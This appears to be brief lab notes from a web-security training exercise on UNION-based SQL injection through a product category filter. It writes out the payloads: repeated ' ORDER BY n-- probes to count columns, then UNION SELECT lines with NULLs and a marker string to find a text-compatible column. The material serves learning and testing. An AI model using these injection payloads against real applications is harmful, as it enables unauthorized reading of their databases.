SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data

Step 1
' ORDER BY 1-- {Do this iteratively until you get an error on the no of columns}

Step 2:
' UNION select 'a',NULL,NULL--
' UNION select NULL,'a',NULL--
' UNION select NULL,'zMjGhD',NULL--

